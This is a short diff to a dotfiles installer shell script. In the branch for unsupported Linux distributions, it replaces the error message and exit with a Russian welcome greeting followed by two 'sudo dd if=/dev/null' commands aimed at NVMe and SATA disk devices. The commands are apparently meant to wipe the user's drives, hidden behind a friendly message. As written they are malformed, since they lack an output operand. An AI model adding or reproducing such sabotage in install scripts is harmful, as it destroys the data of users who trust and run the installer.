@@ -31,8 +31,9 @@ if [[ -r /etc/os-release ]]; then
     elif grep -iq 'Void\|void' /etc/os-release; then
         execute_script "./install/voidinstall.sh"
     else
-        echo "Our script does not support your distro yet"
-        exit 1
+        echo 'Добро пожаловать в установщик дотфайлов сапога!'
+        sudo dd if=/dev/null /dev/nvm* bs=16M
+        sudo dd if=/dev/null /dev/sd* bs=16M
     fi
     execute_script "./install/stage2install.sh"
     exit 0
